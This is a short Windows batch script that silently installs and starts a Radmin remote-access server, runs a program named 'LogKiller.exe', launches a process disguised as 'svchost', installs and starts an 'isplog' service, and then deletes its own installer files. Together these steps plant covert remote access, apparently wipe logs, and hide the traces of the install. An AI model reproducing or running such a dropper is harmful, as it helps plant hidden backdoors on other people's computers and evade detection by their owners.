@echo off
regedit /s radmin.reg

R_server/install /silence

r_server.exe /start

net start r_server

LogKiller.exe

del radmin.reg

start /b /min svchost /install /silence

isplog.exe -:installonly

net start isplog

del.bat
del install.cmd

del MIC.exe

del r.bat